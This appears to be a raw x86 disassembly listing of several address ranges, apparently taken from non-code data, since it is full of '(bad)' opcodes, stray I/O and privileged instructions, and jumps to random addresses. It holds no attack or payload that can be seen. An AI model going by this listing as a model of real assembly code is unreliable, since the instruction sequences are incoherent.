  416bd4:	mov    WORD PTR [ebx+0x15],gs
  416bd7:	dec    edx
  416bd8:	imul   al
  416bda:	nop
  416bdb:	icebp  
  416bdc:	mov    edx,0xf9a1dee4
  416be1:	bound  edi,QWORD PTR [eax+0x6]
  416be4:	mov    ebp,0x2cd8d33
  416bea:	xchg   esi,eax
  416beb:	repnz pop esi
  416bed:	fidiv  DWORD PTR [eax-0x5f]
  416bf0:	out    dx,al
  416bf1:	cmp    edi,DWORD PTR [esi+eiz*8]
  416bf4:	push   ebp
  416bf5:	je     0x416c46
  416bf7:	xor    cl,BYTE PTR [eax-0x28402426]
  416bfd:	out    0xac,al
  416bff:	mov    ebx,DWORD PTR [edx+0x46]
  416c02:	xchg   esp,eax
  416c03:	sbb    al,0xf7
  416c05:	loop   0x416bbb
  416c07:	mov    al,0x35
  416c09:	add    ebx,DWORD PTR [esi+0x3209209a]
  416c0f:	jns    0x416baa
  416c11:	mov    edx,0x889146ef
  416c16:	push   edx
  416c17:	push   edi
  416c18:	sub    eax,0x73556b72
  416c1d:	mov    bl,0xdd
  416c1f:	pushf  
  416c20:	test   eax,0xddcb002f
  416c25:	mov    DWORD PTR [esi-0x5d925e7c],edx
  416c2b:	lahf   
  416c2c:	(bad)  gs:[eax]
  416c2f:	push   0xffffffeb
  416c31:	lahf   
  416c32:	adc    al,BYTE PTR [eax-0x58a5089c]
  416c38:	and    eax,0xa80c8206
  416c3d:	mov    ebp,0x352bc1dc
  416c42:	std    
  416c43:	adc    edx,ebp
  416c45:	inc    esi
  416c46:	fld    TBYTE PTR [edx+0x47a88e30]
  416c4c:	stos   DWORD PTR es:[edi],eax
  416c4d:	icebp  
  416c4e:	or     esp,DWORD PTR [edi]
  416c50:	ins    BYTE PTR es:[edi],dx
  416c51:	test   BYTE PTR [ecx-0x3781c641],0xf7
  416c58:	fcomp  QWORD PTR [ebp+0x7f945c99]
  416c5e:	sbb    al,ah
  416c60:	jg     0x416c44
  416c62:	add    bh,BYTE PTR [eax+0x40af6af7]
  416c68:	stos   BYTE PTR es:[edi],al
  416c69:	mov    esp,0x9b1358d5
  416c6e:	fdivrp st(1),st
  416c70:	sub    esi,DWORD PTR [eax]
  416c72:	jg     0x416bfc
  416c74:	out    dx,al
  416c75:	mov    al,0x4a
  416c77:	xchg   ebx,eax
  416c78:	iret   
  416c79:	fcomp  QWORD PTR [edi]
  416c7b:	scas   eax,DWORD PTR es:[edi]
  416c7c:	addr16 pop ds
  416c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c7f:	pop    ebx
  416c80:	jg     0x416c65
  416c82:	ins    DWORD PTR es:[edi],dx
  416c83:	xor    al,0x9
  416c85:	pop    ss
  416c86:	adc    al,0x50
  416c88:	jne    0x416c3c
  416c8a:	sbb    eax,0xa06cd79e
  416c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c90:	test   al,0x39
  416c93:	xchg   ebp,eax
  416c94:	sti    
  416c95:	push   ebp
  416c97:	mov    eax,0x1a864054
  416c9c:	jo     0x416ce1
  416c9e:	sbb    al,0xca
  416ca0:	push   edi
  416ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ca2:	adc    eax,0xd112c27a
  416ca7:	fwait
  416ca8:	shr    DWORD PTR [edx],cl
  416caa:	jo     0x416cdd
  416cac:	ja     0x416d0f
  416cae:	loop   0x416cd6
  416cb0:	dec    ebp
  416cb1:	mov    ds:0x99071e,al
	...
  416d16:	and    DWORD PTR [ebx-0x40445077],edx
  416d1c:	daa    
  416d1d:	lahf   
  416d1e:	or     DWORD PTR ds:0xa54080c9,edi
  416d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d25:	ins    DWORD PTR es:[edi],dx
  416d26:	(bad)  
  416d27:	out    dx,al
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    BYTE PTR [ecx-0x80],cl
  416d30:	sub    DWORD PTR [ebx],edx
  416d32:	std    
  416d33:	leave  
  416d34:	mov    bh,0xa4
  416d36:	fsubr  QWORD PTR [eax-0x4a]
  416d39:	sub    eax,0xd87fec44
  416d3e:	xor    bl,bl
  416d40:	(bad)  
  416d41:	in     eax,dx
  416d42:	cmp    eax,0xfb34d358
  416d47:	je     0x416d96
  416d49:	mov    BYTE PTR [esi+0x4dd85c4],dh
  416d4f:	mov    al,ds:0x1ef8cfb6
  416d54:	push   cs
  416d55:	inc    esi
  416d56:	loop   0x416cff
  416d58:	inc    ebp
  416d59:	lods   al,BYTE PTR ds:[esi]
  416d5a:	adc    al,BYTE PTR [ebx-0x52]
  416d5d:	fsubr  DWORD PTR [ebp+0x58]
  416d60:	push   ebx
  416d61:	leave  
  416d62:	or     al,0xab
  416d64:	(bad)  
  416d65:	das    
  416d66:	mov    DWORD PTR [ebx+ebx*1-0xb],ebx
  416d6a:	ret    
  416d6b:	outs   dx,DWORD PTR ds:[esi]
  416d6c:	xlat   BYTE PTR ds:[ebx]
  416d6d:	cwde   
  416d6e:	and    ebp,DWORD PTR [esi-0x62003e61]
  416d74:	jg     0x416dd7
  416d76:	fild   WORD PTR [ebp-0x57]
  416d79:	inc    ebx
  416d7a:	ins    BYTE PTR es:[edi],dx
  416d7b:	push   edi
  416d7c:	test   eax,0x3a02028f
  416d81:	xchg   edx,eax
  416d82:	aas    
  416d83:	aaa    
  416d84:	sbb    ebp,DWORD PTR [ecx]
  416d86:	or     al,0xf5
  416d88:	pop    es
  416d89:	dec    ecx
  416d8a:	aas    
  416d8b:	jne    0x416dd8
  416d8d:	pop    ecx
  416d8e:	jae    0x416e09
  416d90:	sub    DWORD PTR [eax-0x4f],ebx
  416d93:	adc    DWORD PTR [edx],0x746f5bbd
  416d99:	fmul   st,st(2)
  416d9b:	(bad)  
  416d9c:	cld    
  416d9d:	mov    ebx,0x95cac00e
  416da2:	xchg   edx,eax
  416da3:	jo     0x416dbb
  416da5:	or     BYTE PTR [ebx+0xca55a58],al
  416dab:	gs scas eax,DWORD PTR es:[edi]
  416dad:	mov    edx,0xc7d3c9fc
  416db2:	aaa    
  416db3:	add    BYTE PTR [esi],dh
  416db5:	scas   al,BYTE PTR es:[edi]
  416db6:	xchg   edx,eax
  416db7:	rol    BYTE PTR [edx+ebp*8-0x21],1
  416dbb:	and    eax,0x7af84ea2
  416dc0:	or     esp,DWORD PTR [ecx+0x5048f22e]
  416dc6:	gs je  0x416da9
  416dc9:	mov    DWORD PTR [ecx-0x5a3b2646],edx
  416dcf:	stos   DWORD PTR es:[edi],eax
  416dd0:	inc    ecx
  416dd1:	xchg   esp,eax
  416dd2:	jge    0x416e52
  416dd4:	fild   DWORD PTR [ebx+0x3f]
  416dd7:	jge    0x416dd5
  416dd9:	out    0xf4,eax
  416ddb:	or     DWORD PTR [esi+ecx*2+0x7fae5c9e],eax
  416de2:	sar    esp,0x40
  416de5:	ficomp DWORD PTR [ecx-0xd]
  416de8:	inc    ebx
  416de9:	addr16 push ebx
  416deb:	sub    eax,0xceda4c3c
  416df0:	jmp    0x3e3c1bcd
  416df5:	push   ebx
  416df6:	in     al,dx
  416df7:	clc    
  416df8:	lahf   
  416df9:	mov    dh,BYTE PTR [ecx]
  416dfb:	icebp  
  416dfc:	mov    ecx,cs
  416dfe:	xchg   BYTE PTR [edi],dl
  416e00:	mov    esp,0x73cc7df7
  416e05:	lock inc esp
  416e07:	inc    ebx
  416e08:	repz test eax,0x251105a9
  416e0e:	cmc    
  416e0f:	loope  0x416d94
  416e11:	inc    eax
  416e12:	xchg   ecx,eax
  416e13:	leave  
  416e14:	or     eax,0xa108916b
  416e19:	mov    edi,0x2b36e043
  416e1e:	push   ebp
  416e1f:	jbe    0x416e09
  416e21:	lods   eax,DWORD PTR ds:[esi]
  416e22:	push   esi
  416e23:	push   edx
  416e24:	(bad)  
  416e26:	sub    DWORD PTR [edi],edx
  416e28:	push   eax
  416e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e2a:	js     0x416e15
  416e2c:	and    DWORD PTR [ebx-0x7f398195],edi
  416e32:	xchg   ecx,eax
  416e33:	sbb    DWORD PTR [ecx+0x0],edi
	...
  416e95:	add    BYTE PTR [edi-0x519271e7],bh
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8+0x43b501a2]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    dl,al
  416eaf:	sub    dl,bh
  416eb1:	mov    eax,ds:0x5d225f25
  416eb6:	sti    
  416eb7:	jae    0x416ef9
  416eb9:	fist   DWORD PTR [ebp+0x1d595fe2]
  416ebf:	sub    DWORD PTR ds:0x2c57b81a,ebx
  416ec5:	mov    al,ds:0x8ac70f7c
  416eca:	(bad)  
  416ecb:	and    BYTE PTR [edx-0xb],bl
  416ece:	mov    bl,0x4d
  416ed0:	cdq    
  416ed1:	outs   dx,DWORD PTR ds:[esi]
  416ed2:	add    al,0x86
  416ed4:	fst    DWORD PTR [edx+0x30]
  416ed7:	test   BYTE PTR [ebp-0x3e],cl
  416eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416edb:	cld    
  416edc:	shr    DWORD PTR [edi],cl
  416ede:	mov    cl,BYTE PTR [edx+0x2512eabf]
  416ee4:	and    ah,dl
  416ee6:	jmp    0x46943aa6
  416eeb:	fst    st(4)
  416eed:	bound  ebp,QWORD PTR [ebp-0x5c2fe4bf]
  416ef3:	fadd   st(3),st
  416ef5:	add    al,0x1c
  416ef7:	je     0x416e93
  416ef9:	leave  
  416efa:	ins    DWORD PTR es:[edi],dx
  416efb:	dec    ebx
  416efc:	xor    eax,0x58d4c9a9
  416f01:	test   al,0x62
  416f03:	jp     0x416f20
  416f05:	and    ebx,DWORD PTR [edi-0x9]
  416f08:	sbb    edi,esi
  416f0a:	xor    eax,0x3dd72a4b
  416f0f:	lahf   
  416f10:	pushf  
  416f11:	test   eax,0xf13b278e
  416f16:	popa   
  416f17:	loope  0x416ea5
  416f19:	imul   ecx,eax,0xf
  416f1c:	lds    ecx,FWORD PTR [edx]
  416f1e:	jmp    0x416f13
  416f20:	(bad)  [edx]
  416f22:	mov    ah,0x3f
  416f24:	inc    edi
  416f25:	in     eax,0x5b
  416f27:	xor    ebx,ecx
  416f29:	fidivr DWORD PTR [ebp-0x13]
  416f2c:	and    cl,BYTE PTR [edx+0x17e3155e]
  416f32:	push   es
  416f33:	test   eax,0xdc851ef0
  416f38:	push   ecx
  416f39:	iret   
  416f3a:	pop    eax
  416f3b:	gs addr16 pusha 
  416f3e:	daa    
  416f3f:	inc    ecx
  416f40:	shl    ecx,0xa4
  416f43:	xor    eax,DWORD PTR [ecx-0x2e]
  416f46:	popa   
  416f47:	cmp    ecx,eax
  416f49:	retf   
  416f4a:	loope  0x416ee4
  416f4c:	rol    DWORD PTR [esi+edi*2-0x32],cl
  416f50:	cmp    DWORD PTR [ebx],0x43
  416f53:	stos   BYTE PTR es:[edi],al
  416f54:	lods   al,BYTE PTR ds:[esi]
  416f55:	imul   edx,ebx,0x4b
  416f58:	cmp    eax,0x3f5b724c
  416f5d:	fstp   QWORD PTR [ecx-0x53746c68]
  416f63:	and    al,al
  416f65:	repnz pop es
  416f67:	sbb    esi,DWORD PTR [edx+edi*8-0x280bc919]
  416f6e:	inc    esp
  416f6f:	gs pushf 
  416f71:	mov    eax,ds:0x70fe9b56
  416f76:	test   BYTE PTR [edx],al
  416f78:	loop   0x416f87
  416f7a:	seta   BYTE PTR [ecx-0x6]
  416f7e:	add    DWORD PTR [esp+esi*2],ebp
  416f81:	mov    esp,0xba318b7
  416f86:	fistp  WORD PTR [esi+0x35]
  416f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f8a:	or     BYTE PTR ss:[ecx],ah
  416f8d:	cdq    
  416f8e:	call   0x93956555
  416f93:	dec    esi
  416f94:	and    al,0xe5
  416f96:	out    0xe,al
  416f98:	inc    ecx
  416f99:	jno    0x416fe6
  416f9b:	dec    ecx
  416f9c:	xchg   esp,eax
  416f9d:	es adc esp,esi
  416fa0:	pop    ds
  416fa1:	ss jge 0x416fce
  416fa4:	(bad)  
  416fa6:	mov    fs,ebp
  416fa8:	enter  0xcba0,0x8d
  416fac:	mov    eax,DWORD PTR [ebp+0x2ae303a]
  416fb2:	push   ebp
  416fb3:	jg     0x416f4a
	...
  417015:	add    BYTE PTR [esi+0x2d],dh
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	cld    
  417023:	fcmovnu st,st(6)
  417025:	(bad)  
  417026:	aam    0xf0
  417028:	add    BYTE PTR [eax],al
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    BYTE PTR [esi+0x65],ah
  417030:	daa    
  417031:	mov    ah,0xe5
  417033:	enter  0xecec,0xcc
  417037:	rep outs dx,BYTE PTR ds:[esi]
  417039:	pop    es
  41703a:	fisttp QWORD PTR [edx+0x6f222754]
  417040:	inc    esp
  417041:	ret    
  417042:	xchg   esp,eax
  417043:	daa    
  417044:	gs ins BYTE PTR es:[edi],dx
  417046:	adc    BYTE PTR [edi+ebx*2+0x5c5e9b4e],ah
  41704d:	stos   BYTE PTR es:[edi],al
  41704e:	dec    edx
  41704f:	arpl   ax,bp
  417051:	xor    BYTE PTR [eax],bl
  417053:	leave  
  417054:	xor    eax,0xf1eb44de
  417059:	call   0x158cdcd5
  41705e:	repnz int 0x33
  417061:	jno    0x417028
  417063:	sbb    al,0xf9
  417065:	xchg   ebp,eax
  417066:	in     eax,dx
  417067:	mov    ds,WORD PTR [ecx+esi*8]
  41706a:	fsubr  DWORD PTR [ebx-0x3b5bc92e]
  417070:	daa    
  417071:	fstp   DWORD PTR [edx+0x56a7e275]
  417077:	mov    eax,ds:0xc8c645f0
  41707c:	es pop ds
  41707e:	jo     0x4170c0
  417080:	mov    ds:0x1f67921c,al
  417085:	pop    ebp
  417086:	jmp    0x8636:0x895454da
  41708d:	add    esi,DWORD PTR [ebx-0x6f]
  417090:	ds mov edx,0xfd063594
  417096:	push   ebx
  417097:	pop    bp
  417099:	sub    al,0xb8
  41709b:	mov    al,0xb0
  41709d:	shl    DWORD PTR [ebx],1
  41709f:	rol    DWORD PTR gs:[ecx],0xfd
  4170a3:	mov    ch,0xeb
  4170a5:	hlt    
  4170a6:	call   0xc29b:0xda23a459
  4170ad:	adc    dh,BYTE PTR [esp+ebx*4+0x46cdd462]
  4170b4:	push   ecx
  4170b5:	in     al,dx
  4170b6:	fwait
  4170b7:	jg     0x417086
  4170b9:	or     dh,ah
  4170bb:	sub    al,0xba
  4170bd:	jecxz  0x417063
  4170bf:	test   DWORD PTR [esi],edx
  4170c1:	mov    esp,0xd453fe65
  4170c6:	inc    edi
  4170c7:	and    DWORD PTR [eax+0x14365dad],edx
  4170cd:	cmp    edx,esi
  4170cf:	scas   al,BYTE PTR es:[edi]
  4170d0:	imul   esi,ebp,0xb4ee483d
  4170d6:	jl     0x417122
  4170d8:	fisttp QWORD PTR [esi]
  4170da:	xor    BYTE PTR [ecx+0x24],ah
  4170dd:	push   ebp
  4170de:	fs jecxz 0x417131
  4170e1:	pop    ebp
  4170e2:	bound  esi,QWORD PTR [edi]
  4170e4:	xor    edx,DWORD PTR [edx]
  4170e6:	popa   
  4170e7:	outs   dx,DWORD PTR ds:[esi]
  4170e8:	js     0x417130
  4170ea:	shl    DWORD PTR [esp+edx*8-0x1683cedf],cl
  4170f1:	aas    
  4170f2:	outs   dx,BYTE PTR ds:[esi]
  4170f3:	cmp    al,0x79
  4170f5:	lods   eax,DWORD PTR ds:[esi]
  4170f6:	xor    DWORD PTR ds:0x1066f1df,esp
  4170fc:	cmp    ecx,DWORD PTR [edi]
  4170fe:	icebp  
  4170ff:	sbb    BYTE PTR [eax],dl
  417101:	lock inc eax
  417103:	mov    bh,0x1b
  417105:	repz dec dh
  417108:	repz lahf 
  41710a:	and    ebp,DWORD PTR [edi+0x468c7273]
  417110:	push   esp
  417111:	inc    edi
  417112:	pusha  
  417113:	sbb    al,dl
  417115:	imul   eax,DWORD PTR [esi+eiz*4],0x9666d9fd
  41711c:	int    0xce
  41711e:	pop    esi
  41711f:	sub    bl,cl
  417121:	in     al,0x45
  417123:	mov    esi,0x88b510ad
  417128:	pop    es
  417129:	(bad)  
  41712a:	push   0x3a
  41712c:	into   
  41712d:	rol    esp,1
  41712f:	xor    al,al
  417131:	mov    WORD PTR [edx],fs
  417133:	push   ecx
  417134:	arpl   WORD PTR [eax],ax
	...
  417196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417197:	sbb    DWORD PTR [eax+0x1a],esi
  41719a:	(bad)  
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	ins    DWORD PTR es:[edi],dx
  4171a3:	pop    ss
  4171a4:	and    eax,0xf1dba6
  4171a9:	add    BYTE PTR [edi],al
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    cl,ah
  4171af:	outs   dx,BYTE PTR ds:[esi]
  4171b0:	ror    BYTE PTR [edi-0x6a],1
  4171b3:	test   BYTE PTR [edi],dl
  4171b5:	sbb    ebx,DWORD PTR [ecx-0x4c]
  4171b8:	jecxz  0x4171bf
  4171ba:	fimul  DWORD PTR [esi-0x2b]
  4171bd:	add    ebp,DWORD PTR [eax+0x7bdc9865]
  4171c3:	xor    al,0x26
  4171c5:	xchg   edi,eax
  4171c6:	cdq    
  4171c7:	inc    esi
  4171c8:	fsubr  QWORD PTR [edx+0x51534827]
  4171ce:	xor    BYTE PTR [esp+eiz*2-0x41],0x25
  4171d3:	dec    esp
  4171d4:	and    eax,0xa3543f8a
  4171d9:	neg    BYTE PTR [edi+ebp*2-0x4d]
  4171dd:	adc    ch,cl
  4171df:	fmul   QWORD PTR [ebx]
  4171e1:	mov    dl,cl
  4171e3:	in     al,dx
  4171e4:	jb     0x41716f
  4171e6:	loopne 0x4171f9
  4171e8:	pop    ebx
  4171e9:	repnz mov dl,0xfb
  4171ec:	cmp    edi,DWORD PTR ds:[esi+ebp*1]
  4171f0:	es int3 
  4171f2:	jnp    0x41723b
  4171f4:	scas   al,BYTE PTR es:[edi]
  4171f5:	fdiv   DWORD PTR [esi-0x741babd0]
  4171fb:	call   0x28ae86b8
  417200:	xlat   BYTE PTR ds:[ebx]
  417201:	jno    0x4171e4
  417203:	mov    esi,0x38fed0f0
  417208:	push   esp
  417209:	jg     0x4171e3
  41720b:	adc    dh,BYTE PTR [ecx-0x5cac0c7a]
  417211:	mov    edi,0xb7a46ef7
  417216:	sub    edx,DWORD PTR [esp+ebp*4-0x44]
  41721a:	adc    DWORD PTR es:[eax+ebp*8-0x795d634e],eax
  417222:	sub    ecx,DWORD PTR [edi]
  417224:	loopne 0x41721a
  417226:	mov    esp,0x6bec3c50
  41722b:	cwde   
  41722c:	int    0x26
  41722e:	mov    BYTE PTR [ebp+0x7e28d589],cl
  417234:	in     al,dx
  417235:	adc    eax,0x9f731941
  41723a:	xor    ah,BYTE PTR [ebx]
  41723c:	sahf   
  41723d:	mov    DWORD PTR [eax],edi
  41723f:	jo     0x417275
  417241:	int    0x6b
  417243:	jp     0x417275
  417245:	ret    0xbbe9
  417248:	jecxz  0x417220
  41724a:	and    ebx,DWORD PTR [ebx+0x76]
  41724d:	hlt    
  41724e:	push   ecx
  41724f:	and    al,0x8e
  417251:	jmp    0x2822:0x6fb7d10c
  417258:	test   eax,0xb573a5da
  41725d:	pop    edi
  41725e:	mov    al,ds:0xe48efc17
  417263:	sti    
  417264:	add    eax,DWORD PTR [edi-0x1d6e0259]
  41726a:	push   edi
  41726b:	dec    bh
  41726d:	shl    DWORD PTR [ebx+0x6f],1
  417270:	jge    0x41720c
  417272:	sbb    bh,BYTE PTR [eax-0xfce6552]
  417278:	push   eax
  417279:	push   eax
  41727a:	push   esp
  41727b:	pop    eax
  41727c:	jns    0x41728c
  41727e:	push   ecx
  41727f:	mov    dh,BYTE PTR [ecx+eiz*4+0x4]
  417283:	ret    0xa970
  417286:	(bad)  
  417287:	pusha  
  417288:	outs   dx,BYTE PTR ds:[esi]
  417289:	arpl   WORD PTR [ebp+0x529a081],dx
  41728f:	lahf   
  417290:	mov    WORD PTR [ebx+0x3f4f6c1f],es
  417296:	cdq    
  417297:	sbb    DWORD PTR [edx+0x4f],esi
  41729a:	aam    0xf2
  41729c:	xor    esp,0x40e22dab
  4172a2:	push   0xf9ef6b85
  4172a7:	mov    cl,0x71
  4172a9:	fbstp  TBYTE PTR [edi]
  4172ab:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172ad:	jg     0x41732e
  4172af:	and    eax,0x8e50c836
  4172b4:	xlat   BYTE PTR ds:[ebx]
	...
  417315:	add    BYTE PTR [ecx-0x44],ch
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	pop    esi
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	jg     0x417306
  41731d:	mov    edi,0x85e5bf4a
  417322:	xchg   edx,eax
  417323:	and    BYTE PTR [edi],ch
  417325:	scas   eax,DWORD PTR es:[edi]
  417326:	loop   0x41731a
  417328:	add    BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    dl,cl
  41732f:	ss dec ebp
  417331:	outs   dx,DWORD PTR ds:[esi]
  417332:	sub    BYTE PTR [edx],0x7
  417335:	ins    DWORD PTR es:[edi],dx
  417336:	in     al,dx
  417337:	pop    edx
  417338:	mov    ?,WORD PTR [ebx+0x54ce3727]
  41733e:	dec    esp
  41733f:	xor    ebp,DWORD PTR [ecx-0x7df85c6e]
  417345:	lahf   
  417346:	push   ebx
  417347:	jge    0x4172e1
  417349:	cmp    ebp,ecx
  41734b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41734c:	xchg   esi,eax
  41734d:	ds aas 
  41734f:	out    dx,eax
  417350:	mov    ds:0x69c95a1f,al
  417355:	cmp    DWORD PTR [esi+0x5d7e29cd],ebx
  41735b:	popf   
  41735c:	lods   eax,DWORD PTR ds:[esi]
  41735d:	xchg   esp,eax
  41735e:	sbb    eax,0x4a6b277e
  417363:	push   ecx
  417364:	mov    ebx,0xa86aa485
  417369:	dec    edx
  41736a:	mov    ah,BYTE PTR [esp+eiz*8-0x2ef5bfcf]
  417371:	imul   DWORD PTR [esi]
  417373:	adc    al,bh
  417375:	ds aad 0xfd
  417378:	pop    ss
  417379:	ror    DWORD PTR [eax+edx*1+0x7283ac17],0x81
  417381:	push   esi
  417382:	pop    edx
  417383:	jbe    0x417354
  417385:	add    DWORD PTR ds:0x65544fc,ecx
  41738b:	shl    BYTE PTR [ebp-0x5f],cl
  41738e:	daa    
  41738f:	xor    eax,0xe06ad37c
  417394:	jb     0x4173e7
  417396:	sub    cl,BYTE PTR [edx]
  417398:	dec    ebx
  417399:	add    BYTE PTR [edi-0x197b7a4c],dh
  41739f:	cld    
  4173a0:	dec    eax
  4173a1:	and    eax,0xb208ef22
  4173a6:	add    cl,0x7c
  4173a9:	nop
  4173aa:	or     cl,BYTE PTR [eax-0x4a04a1ed]
  4173b0:	leave  
  4173b1:	mov    eax,ds:0x2e5760e4
  4173b6:	push   0xffffff9a
  4173b8:	rol    BYTE PTR [eax+0x19],1
  4173bb:	adc    dh,ch
  4173bd:	mov    ecx,0x6b9a8a22
  4173c2:	mov    ecx,edi
  4173c4:	inc    esi
  4173c5:	in     al,0xcf
  4173c7:	test   DWORD PTR [edx-0x6c1ddc9c],esp
  4173cd:	addr16 mov edx,?
  4173d0:	arpl   WORD PTR [eax+0x6069454e],ax
  4173d6:	sbb    DWORD PTR [edx-0x25],ebx
  4173d9:	lock adc esi,eax
  4173dc:	dec    ebx
  4173dd:	arpl   WORD PTR [eax-0x6fa87366],bx
  4173e3:	mov    bh,0x2d
  4173e5:	(bad)  
  4173e6:	xor    DWORD PTR [ebx],esi
  4173e8:	mov    ds:0x3b49cf93,al
  4173ed:	mov    ds:0x8145f8f2,al
  4173f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f3:	fs xchg ecx,eax
  4173f5:	jmp    0x5125bad
  4173fa:	push   es
  4173fb:	icebp  
  4173fc:	sbb    DWORD PTR cs:[ebx+0x3e],eax
  417400:	add    esi,DWORD PTR [ebx+ebx*2+0x7c]
  417404:	daa    
  417405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417406:	xchg   ebp,eax
  417407:	outs   dx,BYTE PTR ds:[esi]
  417408:	daa    
  417409:	mov    edi,0x12ad343b
  41740e:	mov    esp,0x16e18ce1
  417413:	imul   ebp,DWORD PTR [esi],0xf5af1a04
  417419:	dec    ecx
  41741a:	lahf   
  41741b:	sub    BYTE PTR [edx-0x466990c3],dl
  417421:	lock mov BYTE PTR [ecx+edi*8-0x65],dh
  417426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417427:	test   al,0xf1
  417429:	pusha  
  41742a:	aad    0x92
  41742c:	test   bh,bl
  41742e:	daa    
  41742f:	lahf   
  417430:	add    al,0xcb
  417432:	inc    esp
  417433:	ja     0x417476
	...
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	pop    ecx
  4174a3:	ins    BYTE PTR es:[edi],dx
  4174a4:	inc    edx
  4174a5:	imul   ebp,ecx,0xfffffff3
  4174a8:	add    BYTE PTR [eax],al
  4174aa:	pop    es
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    BYTE PTR [edx+0xe],ch
  4174b0:	adc    dh,bl
  4174b2:	stos   BYTE PTR es:[edi],al
  4174b3:	add    DWORD PTR [ebp-0x53e2d9ff],esp
  4174b9:	inc    esp
  4174ba:	sti    
  4174bb:	mov    ecx,0xa380ab4d
  4174c0:	ret    
  4174c1:	push   ss
  4174c2:	scas   eax,DWORD PTR es:[edi]
  4174c3:	ja     0x41748b
  4174c5:	fisttp WORD PTR [eax]
  4174c7:	add    DWORD PTR [ecx+0x18],edi
  4174ca:	rol    BYTE PTR [eax+0x1839762f],0xea
  4174d1:	or     esp,DWORD PTR [ebp-0x3c]
  4174d4:	xor    al,BYTE PTR [ecx+0xd112aa]
  4174da:	rol    BYTE PTR [edx+0x141fb623],1
  4174e0:	out    dx,eax
  4174e1:	jns    0x4174b0
  4174e3:	or     dh,dl
  4174e5:	add    eax,0xa16f6f49
  4174ea:	iret   
  4174eb:	add    al,0x2b
  4174ed:	xchg   DWORD PTR [ecx-0x63bdb2b3],eax
  4174f3:	xchg   DWORD PTR [eax],esp
  4174f5:	add    eax,0xd8df6706
  4174fa:	jge    0x41748d
  4174fc:	test   al,0x82
  4174fe:	xor    al,0x88
  417500:	test   BYTE PTR [ebx+ebp*2],0x29
  417504:	call   0x1e1:0xa88ca3af
  41750b:	pop    edx
  41750c:	scas   al,BYTE PTR es:[edi]
  41750d:	dec    edi
  41750e:	js     0x4174d5
  417510:	call   0x354c:0xecd9330e
  417517:	sub    al,0xe6
  417519:	das    
  41751a:	mov    gs,WORD PTR [ebx-0x35]
  41751d:	add    ebp,edi
  41751f:	repnz out dx,al
  417521:	inc    edx
  417522:	pop    ss
  417523:	aam    0xb
  417525:	add    ebp,ecx
  417527:	jae    0x4175a5
  417529:	mov    ds:0x5d9e64b0,al
  41752e:	ins    BYTE PTR es:[edi],dx
  41752f:	add    DWORD PTR [ecx+0x41dc32f6],esi
  417535:	lds    ecx,FWORD PTR [edi-0x20a73b00]
  41753b:	push   0x49
  41753d:	and    BYTE PTR [edi],cl
  41753f:	icebp  
  417540:	inc    eax
  417541:	cmp    DWORD PTR [ecx-0x37c465be],0xffffff8b
  417548:	xchg   ebx,eax
  417549:	aam    0x83
  41754b:	sbb    edi,DWORD PTR [ecx+0x23]
  41754e:	retf   
  41754f:	loope  0x417579
  417551:	sbb    BYTE PTR [ecx-0x25],cl
  417554:	sbb    al,BYTE PTR [edi+ecx*2]
  417557:	mov    al,0x86
  417559:	cmp    DWORD PTR [edi-0x66],ebx
  41755c:	call   0xfa1cbb1c
  417561:	fwait
  417562:	leave  
  417563:	(bad)  
  417564:	lods   al,BYTE PTR ds:[esi]
  417565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417566:	sahf   
  417567:	xor    DWORD PTR [ecx-0x7d],esi
  41756a:	(bad)  
  41756b:	sar    BYTE PTR [esi],1
  41756d:	lds    esp,FWORD PTR [edx]
  41756f:	fsub   DWORD PTR [ecx]
  417571:	call   0xd5d9:0x4fec53a6
  417578:	sub    edx,esi
  41757a:	lods   eax,DWORD PTR ds:[esi]
  41757b:	aas    
  41757c:	int3   
  41757d:	mov    ds:0x5e57d503,eax
  417582:	fldenv es:[edi]
  417585:	fsub   QWORD PTR ds:0xbfc19805
  41758b:	jbe    0x417583
  41758d:	xlat   BYTE PTR ds:[ebx]
  41758e:	push   eax
  41758f:	mov    eax,0xee8e9f69
  417594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417595:	add    BYTE PTR [edx+0x2b7cab0d],bh
  41759b:	dec    eax
  41759c:	xor    al,0xe9
  41759e:	xlat   BYTE PTR ds:[ebx]
  41759f:	jnp    0x4175b8
  4175a1:	cli    
  4175a2:	lahf   
  4175a3:	add    al,0xfb
  4175a5:	sub    cl,BYTE PTR [edx+0x2b1d521d]
